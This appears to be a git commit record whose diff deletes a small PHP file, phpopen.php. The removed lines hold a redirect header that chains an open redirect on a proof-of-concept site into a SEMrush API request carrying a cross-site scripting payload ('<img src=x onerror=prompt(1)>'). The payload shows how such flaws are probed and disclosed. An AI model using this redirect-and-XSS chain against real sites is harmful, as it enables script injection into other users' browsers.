0fea50b6100d5acc356b5cdcec764565e410a29f
missoum1307 <missoum1307@users.noreply.github.com>
2018-04-02 16:34:00 +0100

    Delete phpopen.php

--- phpopen.php
+++
@@ -1,5 +0,0 @@
-
-<?php 
-header("Location: http://secgeek.net/POC/redir.php?x=http://us.api.semrush.com/?action=report%26type=domain_rank%26domain=i<img src=x onerror=prompt(1)>.wordpress.com")
-
-?>
